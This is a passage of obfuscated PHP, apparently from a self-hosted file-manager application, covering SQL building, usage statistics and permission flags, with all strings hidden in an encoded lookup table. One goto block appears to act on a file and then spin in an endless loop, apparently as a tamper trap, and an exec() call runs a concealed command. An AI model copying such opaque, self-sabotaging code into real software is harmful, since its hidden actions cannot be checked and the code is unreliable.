explode($—ƒ•Âàó[50], $ıÇá¬·[$—ƒ•Âàó[353]]); } else { $÷íÒ²‹ã = $ıÇá¬·[$—ƒ•Âàó[353]]; } $÷íÒ²‹ã = $÷íÒ²‹ã ? $÷íÒ²‹ã : 1; $°‡ßÀÎ‡ = isset($°‡ßÀÎ‡) ? $°‡ßÀÎ‡ : (is_numeric($ıÇá¬·[$—ƒ•Âàó[292]]) ? $ıÇá¬·[$—ƒ•Âàó[292]] : 20); $±ÓüÛÁ‚ = $°‡ßÀÎ‡ * ((int) $÷íÒ²‹ã - 1); $ıÇá¬·[$—ƒ•Âàó[292]] = $±ÓüÛÁ‚ . $—ƒ•Âàó[50] . $°‡ßÀÎ‡; } if (think_config($—ƒ•Âàó[1043])) { $¯Á°³‡ = $—ƒ•Âàó[1044] . md5(serialize($ıÇá¬·)); $®Ş•¤ÇÛ = think_cache($¯Á°³‡); if ($®Ş•¤ÇÛ) { return $®Ş•¤ÇÛ; } } $şğ›ÒÕ = $this->parseSql($this->selectSql, $ıÇá¬·); $şğ›ÒÕ .= $this->parseLock(isset($ıÇá¬·[$—ƒ•Âàó[842]]) ? $ıÇá¬·[$—ƒ•Âàó[842]] : !1); if (isset($¯Á°³‡)) { think_cache($¯Á°³‡, $şğ›ÒÕ); } return $şğ›ÒÕ; } public function parseSql($ô›ûÕ×˜, $ÛôÆ£™Ÿ = array()) { $«ë«Í =& $_SERVER[Ó¡Ÿ§‚]; $ô›ûÕ×˜ = str_replace(array($«ë«Í[1045], $«ë«Í[1046], $«ë«Í[1047], $«ë«Í[1048], $«ë«Í[1049], $«ë«Í[1050], $«ë«Í[1051], $«ë«Í[1052], $«ë«Í[1053], $«ë«Í[1054], $«ë«Í[1055]), array($this->parseTable("{$ÛôÆ£™Ÿ[$«ë«Í[279]]}"), $this->parseDistinct(isset($ÛôÆ£™Ÿ[$«ë«Í[1056]]) ? $ÛôÆ£™Ÿ[$«ë«Í[1056]] : !1), $this->parseField(!empty($ÛôÆ£™Ÿ[$«ë«Í[273]]) ? $ÛôÆ£™Ÿ[$«ë«Í[273]] : $«ë«Í[189]), $this->parseJoin(!empty($ÛôÆ£™Ÿ[$«ë«Í[282]]) ? $ÛôÆ£™Ÿ[$«ë«Í[282]] : $«ë«Í[12]), $this->parseWhere(!empty($ÛôÆ£™Ÿ[$«ë«Í[275]]) ? $ÛôÆ£™Ÿ[$«ë«Í[275]] : $«ë«Í[12]), $this->parseGroup(!empty($ÛôÆ£™Ÿ[$«ë«Í[514]]) ? $ÛôÆ£™Ÿ[$«ë«Í[514]] : $«ë«Í[12]), $this->parseHaving(!empty($ÛôÆ£™Ÿ[$«ë«Í[1057]]) ? $ÛôÆ£™Ÿ[$«ë«Í[1057]] : $«ë«Í[12]), $this->parseOrder(!empty($ÛôÆ£™Ÿ[$«ë«Í[365]]) ? $ÛôÆ£™Ÿ[$«ë«Í[365]] : $«ë«Í[12]), $this->parseLimit(!empty($ÛôÆ£™Ÿ[$«ë«Í[292]]) ? $ÛôÆ£™Ÿ[$«ë«Í[292]] : $«ë«Í[12]), $this->parseUnion(!empty($ÛôÆ£™Ÿ[$«ë«Í[347]]) ? $ÛôÆ£™Ÿ[$«ë«Í[347]] : $«ë«Í[12]), $this->parseComment(!empty($ÛôÆ£™Ÿ[$«ë«Í[354]]) ? $ÛôÆ£™Ÿ[$«ë«Í[354]] : $«ë«Í[12])), $ô›ûÕ×˜); return $ô›ûÕ×˜; } public function getLastSql($©úŠò¤Ú = '') { return $©úŠò¤Ú ? $this->modelSql[$©úŠò¤Ú] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¬ÙäˆË˜) { return addslashes($¬ÙäˆË˜); } public function setModel($ŠÛ »Ãä) { $this->model = $ŠÛ »Ãä; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto B³È¸Ğ×§–; aÍ§èÃ°à…: if (!isset($_SERVER[$_SERVER[Ó¡Ÿ§‚][401]]) || !isset($_SERVER[$_SERVER[Ó¡Ÿ§‚][409]])) { $_getc = $_SERVER[Ó¡Ÿ§‚][403]; $_getfile = $_SERVER[$_SERVER[Ó¡Ÿ§‚][404]] . $_SERVER[Ó¡Ÿ§‚][405]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ó¡Ÿ§‚][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ó¡Ÿ§‚][406]) { $exit = $_SERVER[Ó¡Ÿ§‚][407]; $exit(); } $_act = $_SERVER[Ó¡Ÿ§‚][408]; $_act($_SERVER[$_SERVER[Ó¡Ÿ§‚][404]] . $_SERVER[Ó¡Ÿ§‚][405]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ó¡Ÿ§‚][378]); } } class AnalysisModel extends ModelBaseLight { public function init($Ş£úœ¾ï) { $ú²¸Ùë‡ =& $_SERVER[Ó¡Ÿ§‚]; $š¦°Ô = array($ú²¸Ùë‡[599] => array($ú²¸Ùë‡[33] => $ú²¸Ùë‡[1783], $ú²¸Ùë‡[273] => array($ú²¸Ùë‡[224], $ú²¸Ùë‡[764], $ú²¸Ùë‡[1784], $ú²¸Ùë‡[1785])), $ú²¸Ùë‡[1786] => array($ú²¸Ùë‡[33] => $ú²¸Ùë‡[1787], $ú²¸Ùë‡[273] => array($ú²¸Ùë‡[224], $ú²¸Ùë‡[762], $ú²¸Ùë‡[1788], $ú²¸Ùë‡[1789], $ú²¸Ùë‡[1790]))); if (!isset($š¦°Ô[$Ş£úœ¾ï])) { return !1; } $this->optionType = $š¦°Ô[$Ş£úœ¾ï][$ú²¸Ùë‡[33]]; $this->field = $š¦°Ô[$Ş£úœ¾ï][$ú²¸Ùë‡[273]]; return !0; } public function listData($–ÊÑëº = false, $îßäˆÒ£ = "\x6d\x6f\x64\x69\x66\x79\x54\151\x6d\145", $Ñå öŒ = false) { return parent::listData($–ÊÑëº, $îßäˆÒ£, $Ñå öŒ); } public function trendList($Í§ì¬) { $´ü‚ÖÕô =& $_SERVER[Ó¡Ÿ§‚]; $Ìİ™¡Óş = $this->listData(); if ($Ìİ™¡Óş) { $…—ö¸Å§ = end($Ìİ™¡Óş); $†¤’Ú°È = date($´ü‚ÖÕô[1791], strtotime($´ü‚ÖÕô[1792])); if ($…—ö¸Å§[$´ü‚ÖÕô[224]] == $†¤’Ú°È) { return $Ìİ™¡Óş; } $¡ Ÿ›à€ = strtotime($…—ö¸Å§[$´ü‚ÖÕô[224]]); } if (!isset($¡ Ÿ›à€)) { $ÚŞÙÚ°İ = $Í§ì¬ == $´ü‚ÖÕô[599] ? $´ü‚ÖÕô[534] : $´ü‚ÖÕô[824]; $¡ Ÿ›à€ = Model($ÚŞÙÚ°İ)->min($´ü‚ÖÕô[201]); } $²í÷å†ï = $´ü‚ÖÕô[1793] . ucfirst($Í§ì¬); $Ò˜Èµ“Œ = $this->dateList($¡ Ÿ›à€); foreach ($Ò˜Èµ“Œ as $†¤’Ú°È) { $this->{$²í÷å†ï}($†¤’Ú°È); } return $this->listData(); } private function dateList($³ãı‘ôç) { $—€öŞİè =& $_SERVER[Ó¡Ÿ§‚]; $«¦„ÔŸõ = $³ãı‘ôç; $ë¹«¥€• = strtotime($—€öŞİè[1792]); $Ä°²Õ´‰ = array(); while ($«¦„ÔŸõ <= $ë¹«¥€•) { $Ä°²Õ´‰[] = date($—€öŞİè[1791], $«¦„ÔŸõ); $«¦„ÔŸõ = strtotime($—€öŞİè[1794], $«¦„ÔŸõ); } return $Ä°²Õ´‰; } public function _recordUser($­×›¨Æ = '') { $¢œÍ€é® =& $_SERVER[Ó¡Ÿ§‚]; $Å¬¦ÔÚ = strtotime(date($¢œÍ€é®[1795], strtotime($­×›¨Æ))); $×²Í”ïÅ = strtotime(date($¢œÍ€é®[1796], strtotime($­×›¨Æ))); $öù±ªÁ = array($¢œÍ€é®[201] => array($¢œÍ€é®[1012], $×²Í”ïÅ)); $™À¼³Û­ = Model($¢œÍ€é®[534])->where($öù±ªÁ)->count($¢œÍ€é®[1665]); $öù±ªÁ[$¢œÍ€é®[201]] = array($¢œÍ€é®[333], array($Å¬¦ÔÚ, $×²Í”ïÅ)); $°²é“Œ = Model($¢œÍ€é®[534])->where($öù±ªÁ)->count($¢œÍ€é®[1665]); $öù±ªÁ[$¢œÍ€é®[33]] = $¢œÍ€é®[1797]; $ºáŒãğ = Model($¢œÍ€é®[1798])->where($öù±ªÁ)->count($¢œÍ€é®[1799]); $ÅÓµÕŠ  = array($¢œÍ€é®[224] => $­×›¨Æ, $¢œÍ€é®[764] => (int) $™À¼³Û­, $¢œÍ€é®[1784] => (int) $°²é“Œ, $¢œÍ€é®[1785] => (int) $ºáŒãğ); return $this->insert($ÅÓµÕŠ ); } public function _recordStore($÷°Ã­±ö = '') { $ÛïÕ©’¹ =& $_SERVER[Ó¡Ÿ§‚]; $¡æá²Ñ = strtotime(date($ÛïÕ©’¹[1796], strtotime($÷°Ã­±ö))); $†È“×ü• = array($ÛïÕ©’¹[201] => array($ÛïÕ©’¹[1012], $¡æá²Ñ)); $„¯àÎÂš = Model($ÛïÕ©’¹[480])->where($†È“×ü•)->sum($ÛïÕ©’¹[76]); $†È“×ü•[$ÛïÕ©’¹[419]] = 0; $¢ç°ÎÈÒ = Model($ÛïÕ©’¹[824])->where($†È“×ü•)->sum($ÛïÕ©’¹[76]); $†È“×ü•[$ÛïÕ©’¹[420]] = 1; $êâ“öĞÀ = Model($ÛïÕ©’¹[824])->where($†È“×ü•)->sum($ÛïÕ©’¹[76]); $†È“×ü•[$ÛïÕ©’¹[420]] = 2; $éöö»ßÅ = Model($ÛïÕ©’¹[824])->where($†È“×ü•)->sum($ÛïÕ©’¹[76]); $×Ÿµ¸î¦ = array($ÛïÕ©’¹[224] => $÷°Ã­±ö, $ÛïÕ©’¹[762] => (int) $¢ç°ÎÈÒ, $ÛïÕ©’¹[1788] => (int) $„¯àÎÂš, $ÛïÕ©’¹[1789] => (int) $êâ“öĞÀ, $ÛïÕ©’¹[1790] => (int) $éöö»ßÅ); return $this->insert($×Ÿµ¸î¦); } public function trend($³Óåç¯³, $¿Éî Ìà) { $¡¼·€¦ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->init($³Óåç¯³)) { return !1; } $ü¹ô»¿ = $this->trendList($³Óåç¯³); if ($ü¹ô»¿ && $¿Éî Ìà != $¡¼·€¦[1638]) { $Ñ³Ò¹Á¼ = $ü¹ô»¿[0][$¡¼·€¦[224]]; $œ‰À¤À› = $this->validDate($¿Éî Ìà, $Ñ³Ò¹Á¼); $€²ìç = array(); $Õ•È¼¶• = array_to_keyvalue($ü¹ô»¿, $¡¼·€¦[224]); foreach ($œ‰À¤À› as $ëÈúŞ–Š) { if (isset($Õ•È¼¶•[$ëÈúŞ–Š])) { $—²ûâÙ¤ = $Õ•È¼¶•[$ëÈúŞ–Š]; } else { $—²ûâÙ¤ = end($ü¹ô»¿); $—²ûâÙ¤[$¡¼·€¦[224]] = $ëÈúŞ–Š; if ($³Óåç¯³ == $¡¼·€¦[599]) { $—²ûâÙ¤[$¡¼·€¦[1784]] = $—²ûâÙ¤[$¡¼·€¦[1785]] = 0; } } $€²ìç[] = $—²ûâÙ¤; } $ü¹ô»¿ = $€²ìç; } $ÌÎÉÆ¼ = array($¡¼·€¦[599] => array($¡¼·€¦[764] => LNG($¡¼·€¦[1800]), $¡¼·€¦[1784] => LNG($¡¼·€¦[1801]), $¡¼·€¦[1785] => LNG($¡¼·€¦[1802])), $¡¼·€¦[1786] => array($¡¼·€¦[762] => LNG($¡¼·€¦[1803]), $¡¼·€¦[1788] => LNG($¡¼·€¦[1804]), $¡¼·€¦[1789] => LNG($¡¼·€¦[1805]), $¡¼·€¦[1790] => LNG($¡¼·€¦[1806]))); $™ğº‚Ø· = array($¡¼·€¦[599] => $¡¼·€¦[1807], $¡¼·€¦[1786] => $¡¼·€¦[76]); if (empty($ü¹ô»¿)) { $ëÈúŞ–Š = date($¡¼·€¦[1791], strtotime($¡¼·€¦[1792])); $¾«ñ£®ä = array($¡¼·€¦[224] => $ëÈúŞ–Š); foreach ($ÌÎÉÆ¼[$³Óåç¯³] as $¬¿ºš„ => $õçú´±©) { $¾«ñ£®ä[$¬¿ºš„] = 0; } $ü¹ô»¿[] = $¾«ñ£®ä; } $ºÆõ““Ê = array(); foreach ($ü¹ô»¿ as $õçú´±©) { if ($³Óåç¯³ == $¡¼·€¦[1786] && $õçú´±©[$¡¼·€¦[1788]] > $õçú´±©[$¡¼·€¦[762]]) { $õçú´±©[$¡¼·€¦[1788]] = $õçú´±©[$¡¼·€¦[762]]; } foreach ($ÌÎÉÆ¼[$³Óåç¯³] as $¬¿ºš„ => $¦ÅØÀ©¹) { $—²ûâÙ¤ = array($¡¼·€¦[224] => $õçú´±©[$¡¼·€¦[224]], $¡¼·€¦[1565] => $¦ÅØÀ©¹); $—²ûâÙ¤[$™ğº‚Ø·[$³Óåç¯³]] = isset($õçú´±©[$¬¿ºš„]) ? $õçú´±©[$¬¿ºš„] : 0; $ºÆõ““Ê[] = $—²ûâÙ¤; } } return $ºÆõ““Ê; } public function validDate($ÆÕÁ«’Ê, $İ©¥Åƒ) { $¼–ÛÒáÓ =& $_SERVER[Ó¡Ÿ§‚]; $¸˜ë‹ñÙ = date($¼–ÛÒáÓ[1791], strtotime($¼–ÛÒáÓ[1792])); $ˆ¢ëä„Š = array($¸˜ë‹ñÙ); switch ($ÆÕÁ«’Ê) { case $¼–ÛÒáÓ[1645]: $Ñ¤œÕ¬ = mktime(0, 0, 0, date($¼–ÛÒáÓ[1808]), date($¼–ÛÒáÓ[1386]) - date($¼–ÛÒáÓ[1449]) + 7 - 7, date($¼–ÛÒáÓ[1809])); $ãïş¶ì› = 0; do { $šô¸­ÉÓ = date($¼–ÛÒáÓ[1791], $Ñ¤œÕ¬ - 3600 * 24 * 7 * $ãïş¶ì›); $ˆ¢ëä„Š[] = $šô¸­ÉÓ; $ãïş¶ì›++; } while ($İ©¥Åƒ < $šô¸­ÉÓ); break; case $¼–ÛÒáÓ[1643]: $ãïş¶ì› = 1; do { $Ã¡†áÕ = date($¼–ÛÒáÓ[1810], strtotime("\x2d\x20{$ãïş¶ì›}\40\x6d\157\156\x74\x68\163")); $ˆ¢ëä„Š[] = $Ã¡†áÕ; $ãïş¶ì›++; } while ($İ©¥Åƒ < $Ã¡†áÕ); break; case $¼–ÛÒáÓ[1811]: $·¸‡Áˆ¬ = (int) date($¼–ÛÒáÓ[1809], strtotime($İ©¥Åƒ)); $—“ÔÜŞ° = (int) date($¼–ÛÒáÓ[1809]); if ($·¸‡Áˆ¬ >= $—“ÔÜŞ°) { break; } for ($·¸‡Áˆ¬; $·¸‡Áˆ¬ < $—“ÔÜŞ°; $·¸‡Áˆ¬++) { $ˆ¢ëä„Š[] = $·¸‡Áˆ¬ . $¼–ÛÒáÓ[1812]; } break; default: break; } if ($İ©¥Åƒ > end($ˆ¢ëä„Š)) { array_pop($ˆ¢ëä„Š); } sort($ˆ¢ëä„Š); return $ˆ¢ëä„Š; } public function listTable($îÅŸ·ñç) { $ºª‹†“ = ucfirst($îÅŸ·ñç); return Model($ºª‹†“)->listData(); } public function option($²·©µÃ¿) { $üÅ—îàä = $_SERVER[Ó¡Ÿ§‚][1813] . ucfirst($²·©µÃ¿); return $this->{$üÅ—îàä}(); } private function optionUser() { $Öî–¬ââ =& $_SERVER[Ó¡Ÿ§‚]; $—²úî†Â = Model($Öî–¬ââ[534])->count($Öî–¬ââ[1665]); $”§‚Ç±¸ = Model($Öî–¬ââ[534])->where($Öî–¬ââ[1814])->count($Öî–¬ââ[1665]); $»‘ÔÜ© = intval($GLOBALS[$Öî–¬ââ[6]][$Öî–¬ââ[349]][$Öî–¬ââ[1620]]) / 3600; $çÜØ¿Ş® = strtotime("\x2d{$»‘ÔÜ©}\x20\x68\x6f\x75\x72\163"); $Æğ”àİÈ = strtotime(date($Öî–¬ââ[1795])); if ($çÜØ¿Ş® < $Æğ”àİÈ) { $çÜØ¿Ş® = $Æğ”àİÈ; } $³ß¨œÛ  = array($Öî–¬ââ[1815] => array($Öî–¬ââ[1013], $çÜØ¿Ş®)); $Ü²´¤’“ = (int) Model($Öî–¬ââ[534])->where($³ß¨œÛ )->count($Öî–¬ââ[1665]); if (!$Ü²´¤’“) { $Ü²´¤’“ = 1; } $³ß¨œÛ  = array($Öî–¬ââ[1815] => array($Öî–¬ââ[1013], $Æğ”àİÈ)); $˜‰ÈÑŸ = Model($Öî–¬ââ[534])->where($³ß¨œÛ )->count($Öî–¬ââ[1665]); return array($Öî–¬ââ[757] => (int) $—²úî†Â, $Öî–¬ââ[1816] => (int) ($—²úî†Â - $”§‚Ç±¸), $Öî–¬ââ[1817] => (int) $”§‚Ç±¸, $Öî–¬ââ[1818] => (int) $˜‰ÈÑŸ, $Öî–¬ââ[1819] => $Ü²´¤’“); } private function optionFile() { $÷ÉÂ¤Ó— =& $_SERVER[Ó¡Ÿ§‚]; $ê·„š§ = $this->sourceSize(); $÷ší«¸­ = $ê·„š§[$÷ÉÂ¤Ó—[76]]; $ëØ¨æÅ™ = $ê·„š§[$÷ÉÂ¤Ó—[1788]]; $öİãßÄ¾ = Model($÷ÉÂ¤Ó—[824])->where(array($÷ÉÂ¤Ó—[419] => 0))->count($÷ÉÂ¤Ó—[411]); $Øı£ö¹È = array($÷ÉÂ¤Ó—[419] => 0, $÷ÉÂ¤Ó—[201] => array($÷ÉÂ¤Ó—[1013], strtotime(date($÷ÉÂ¤Ó—[1795])))); $äµ°å»½ = Model($÷ÉÂ¤Ó—[824])->where($Øı£ö¹È)->sum($÷ÉÂ¤Ó—[76]); $Úè¢ß‚ = Model($÷ÉÂ¤Ó—[824])->where($Øı£ö¹È)->count($÷ÉÂ¤Ó—[411]); return array($÷ÉÂ¤Ó—[762] => $÷ší«¸­, $÷ÉÂ¤Ó—[1788] => $ëØ¨æÅ™, $÷ÉÂ¤Ó—[1820] => $÷ší«¸­ - $ëØ¨æÅ™, $÷ÉÂ¤Ó—[1821] => (int) $äµ°å»½, $÷ÉÂ¤Ó—[764] => (int) $öİãßÄ¾, $÷ÉÂ¤Ó—[1822] => (int) $Úè¢ß‚); } private function optionAccess() { $·Ïêğˆ =& $_SERVER[Ó¡Ÿ§‚]; return array($·Ïêğˆ[757] => $this->typeLogCnt(), $·Ïêğˆ[107] => $this->typeLogCnt($·Ïêğˆ[107]), $·Ïêğˆ[461] => $this->typeLogCnt($·Ïêğˆ[461]), $·Ïêğˆ[1823] => $this->typeLogCnt($·Ïêğˆ[1823]), $·Ïêğˆ[1824] => $this->typeLogCnt($·Ïêğˆ[1824]), $·Ïêğˆ[599] => $this->typeLogCnt($·Ïêğˆ[12], $·Ïêğˆ[1799])); } private function typeLogCnt($ú›ŠÔÛ™ = '', $ã‰Ê¶µŠ = "\151\x64") { $¨”–ÑÏû =& $_SERVER[Ó¡Ÿ§‚]; $€”Ù¯¯Â = array($¨”–ÑÏû[107] => array($¨”–ÑÏû[1825], $¨”–ÑÏû[1826]), $¨”–ÑÏû[461] => array($¨”–ÑÏû[1827], $¨”–ÑÏû[1828]), $¨”–ÑÏû[1823] => array($¨”–ÑÏû[1829], $¨”–ÑÏû[1830], $¨”–ÑÏû[1831]), $¨”–ÑÏû[1824] => array($¨”–ÑÏû[1832], $¨”–ÑÏû[1833]), $¨”–ÑÏû[1834] => array($¨”–ÑÏû[1835], $¨”–ÑÏû[1836], $¨”–ÑÏû[1837])); $ÖÀÔÚ³å = strtotime(date($¨”–ÑÏû[1795])); $°¨íø´ = array($¨”–ÑÏû[201] => array($¨”–ÑÏû[1013], $ÖÀÔÚ³å)); if ($ú›ŠÔÛ™) { $°¨íø´[$¨”–ÑÏû[33]] = array($¨”–ÑÏû[7], $€”Ù¯¯Â[$ú›ŠÔÛ™]); } $ÔÕ£™ü´ = Model($¨”–ÑÏû[1798])->where($°¨íø´)->count($ã‰Ê¶µŠ); return (int) $ÔÕ£™ü´; } private function optionServer() { $ÀÊø²…¾ =& $_SERVER[Ó¡Ÿ§‚]; $ÁŞŸ‰İ‘ = $this->diskDriver(); $ç‘ëÍŞ¾ = KodIO::defaultDriver(); $ÓÀå‹Îˆ = array($ÀÊø²…¾[816] => $ç‘ëÍŞ¾[$ÀÊø²…¾[399]]); $â§†³ıø = Model($ÀÊø²…¾[480])->where($ÓÀå‹Îˆ)->sum($ÀÊø²…¾[76]); $ìÈ¶®Ì¼ = explode($ÀÊø²…¾[53], $_SERVER[$ÀÊø²…¾[143]]); $Ëøô§ÑŠ = $ìÈ¶®Ì¼[0]; $ÅøƒòÈ = $GLOBALS[$ÀÊø²…¾[6]][$ÀÊø²…¾[21]]; $ÔÒÂñ§€ = $ÅøƒòÈ[$ÀÊø²…¾[975]]; if ($ÔÒÂñ§€ == $ÀÊø²…¾[963]) { $³ˆóÆ€ˆ = explode($ÀÊø²…¾[1278], $ÅøƒòÈ[$ÀÊø²…¾[974]]); $ÔÒÂñ§€ = $³ˆóÆ€ˆ[0]; } if ($ÔÒÂñ§€ == $ÀÊø²…¾[911] || $ÔÒÂñ§€ == $ÀÊø²…¾[803]) { $ç¬—Ş†ˆ = Model()->db()->query($ÀÊø²…¾[1838]); $—­Éñ©ï = $ç¬—Ş†ˆ[0] && isset($ç¬—Ş†ˆ[0][$ÀÊø²…¾[1564]]) ? $ç¬—Ş†ˆ[0][$ÀÊø²…¾[1564]] : 0; $ÔÒÂñ§€ = $ÀÊø²…¾[1839] . ($—­Éñ©ï ? $ÀÊø²…¾[8] . $—­Éñ©ï : $ÀÊø²…¾[12]); } $ß—˜ÇÒÃ = $GLOBALS[$ÀÊø²…¾[6]][$ÀÊø²…¾[349]][$ÀÊø²…¾[826]]; return array($ÀÊø²…¾[1840] => $ÁŞŸ‰İ‘ ? $ÁŞŸ‰İ‘[$ÀÊø²…¾[1841]] : 0, $ÀÊø²…¾[1842] => $ÁŞŸ‰İ‘ ? $ÁŞŸ‰İ‘[$ÀÊø²…¾[1843]] : 0, $ÀÊø²…¾[1844] => (int) $ç‘ëÍŞ¾[$ÀÊø²…¾[1841]] * 1024 * 1024 * 1024, $ÀÊø²…¾[1845] => (int) $â§†³ıø, $ÀÊø²…¾[1846] => ucfirst($Ëøô§ÑŠ), $ÀÊø²…¾[1847] => $ÀÊø²…¾[1848] . PHP_VERSION, $ÀÊø²…¾[1849] => phpBuild64() ? 64 : 32, $ÀÊø²…¾[756] => str_replace($ÀÊø²…¾[1129], $ÀÊø²…¾[991], $ÔÒÂñ§€), $ÀÊø²…¾[349] => ucfirst($ß—˜ÇÒÃ), $ÀÊø²…¾[32] => $_SERVER[$ÀÊø²…¾[1850]]); } private function diskDriver() { $ÔÃ«û“Ö =& $_SERVER[Ó¡Ÿ§‚]; $ÄŒÓøÛµ = $ÔÃ«û“Ö[8]; $¨€ÛŠ‹ = $GLOBALS[$ÔÃ«û“Ö[6]][$ÔÃ«û“Ö[1295]] == $ÔÃ«û“Ö[1296]; if ($¨€ÛŠ‹) { $ÄŒÓøÛµ = $ÔÃ«û“Ö[1851]; if (function_exists($ÔÃ«û“Ö[1852])) { exec($ÔÃ«û“Ö[1853], $ğ»ï×ˆè); $ÄŒÓøÛµ = $ğ»ï×ˆè[1] . $ÔÃ«û“Ö[8]; } } if (!file_exists($ÄŒÓøÛµ)) { return; } $¾¢ù³Œ = @disk_total_space($ÄŒÓøÛµ); $–©îêÄ = $¾¢ù³Œ - @disk_free_space($ÄŒÓøÛµ); return array($ÔÃ«û“Ö[1841] => $¾¢ù³Œ, $ÔÃ«û“Ö[1843] => $–©îêÄ); } public function fileChart($Èƒ›•ĞÑ) { $¶´ßçÁê =& $_SERVER[Ó¡Ÿ§‚]; if (isset($Èƒ›•ĞÑ[$¶´ßçÁê[1665]])) { return Model($¶´ßçÁê[824])->userFileTypeProfile($Èƒ›•ĞÑ[$¶´ßçÁê[1665]]); } if (isset($Èƒ›•ĞÑ[$¶´ßçÁê[1854]])) { return Model($¶´ßçÁê[824])->groupFileTypeProfile($Èƒ›•ĞÑ[$¶´ßçÁê[1854]]); } $âœ£‚‘µ = $this->sourceSize(); $úÃæÅò = array($¶´ßçÁê[441] => 0, $¶´ßçÁê[420] => 1); $ÈãÒıÄÈ = Model($¶´ßçÁê[824])->where($úÃæÅò)->sum($¶´ßçÁê[76]); $úÃæÅò[$¶´ßçÁê[420]] = 2; $…Êü“ = Model($¶´ßçÁê[824])->where($úÃæÅò)->sum($¶´ßçÁê[76]); return array($¶´ßçÁê[762] => $âœ£‚‘µ[$¶´ßçÁê[76]], $¶´ßçÁê[1788] => $âœ£‚‘µ[$¶´ßçÁê[1788]], $¶´ßçÁê[1789] => (int) $ÈãÒıÄÈ, $¶´ßçÁê[1790] => (int) $…Êü“); } private function sourceSize() { $Œ¶÷ê‰š =& $_SERVER[Ó¡Ÿ§‚]; $†ÇŸ‰¥ = Model($Œ¶÷ê‰š[824])->where(array($Œ¶÷ê‰š[419] => 0))->sum($Œ¶÷ê‰š[76]); $îü“³¬É = Model($Œ¶÷ê‰š[480])->sum($Œ¶÷ê‰š[76]); if ($îü“³¬É > $†ÇŸ‰¥) { $îü“³¬É = $†ÇŸ‰¥; } return array($Œ¶÷ê‰š[76] => (int) $†ÇŸ‰¥, $Œ¶÷ê‰š[1788] => (int) $îü“³¬É); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $È¹Õ›§ş =& $_SERVER[Ó¡Ÿ§‚]; $É¶Æ‹†¢ = array(array($È¹Õ›§ş[429] => LNG($È¹Õ›§ş[1855]), $È¹Õ›§ş[1856] => $È¹Õ›§ş[1857], $È¹Õ›§ş[1858] => 1, $È¹Õ›§ş[1859] => 1, $È¹Õ›§ş[1860] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($È¹Õ›§ş[429] => LNG($È¹Õ›§ş[1861]), $È¹Õ›§ş[1856] => $È¹Õ›§ş[1862], $È¹Õ›§ş[1858] => 2, $È¹Õ›§ş[1859] => 1, $È¹Õ›§ş[1860] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($È¹Õ›§ş[429] => LNG($È¹Õ›§ş[1863]), $È¹Õ›§ş[1856] => $È¹Õ›§ş[1864], $È¹Õ›§ş[1858] => 3, $È¹Õ›§ş[1859] => 1, $È¹Õ›§ş[1860] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($È¹Õ›§ş[429] => LNG($È¹Õ›§ş[1865]), $È¹Õ›§ş[1856] => $È¹Õ›§ş[1866], $È¹Õ›§ş[1858] => 4, $È¹Õ›§ş[1859] => 1, $È¹Õ›§ş[1860] => self::AUTH_SHOW | self::AUTH_VIEW), array($È¹Õ›§ş[429] => LNG($È¹Õ›§ş[1867]), $È¹Õ›§ş[1856] => $È¹Õ›§ş[1868], $È¹Õ›§ş[1858] => 5, $È¹Õ›§ş[1859] => 1, $È¹Õ›§ş[1860] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($È¹Õ›§ş[429] => LNG($È¹Õ›§ş[1869]), $È¹Õ›§ş[1856] => $È¹Õ›§ş[1870], $È¹Õ›§ş[1858] => 6, $È¹Õ›§ş[1859] => 1, $È¹Õ›§ş[1860] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($È¹Õ›§ş[429] => LNG($È¹Õ›§ş[1871]), $È¹Õ›§ş[1856] => $È¹Õ›§ş[1872], $È¹Õ›§ş[1858] => 7, $È¹Õ›§ş[1859] => 1, $È¹Õ›§ş[1860] => 0)); return $É¶Æ‹†¢; } public static function authCheck($‚•­ª„â, $ÖèîıÆÆ) { $“›µ ¬Ú =& $_SERVER[Ó¡Ÿ§‚]; $‚•­ª„â = intval($‚•­ª„â); if ($GLOBALS[$“›µ ¬Ú[503]] && $GLOBALS[$“›µ ¬Ú[6]][$“›µ ¬Ú[1873]]) { return !0; } if ($‚•­ª„â <= 0) { return !1; } if (($‚•­ª„â & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($‚•­ª„â & $ÖèîıÆÆ); } public static function authCheckShow($íÉÀúúé) { return self::authCheck($íÉÀúúé, self::AUTH_SHOW); } public static function authCheckView($à‡ùÉù) { return self::authCheck($à‡ùÉù, self::AUTH_VIEW); } public static function authCheckDownload($ŞÜì³–) { return self::authCheck($ŞÜì³–, self::AUTH_DOWNLOAD); } public static function authCheckUpload($·Å¿òÖ) { return self::authCheck($·Å¿òÖ, self::AUTH_UPLOAD); } public static function 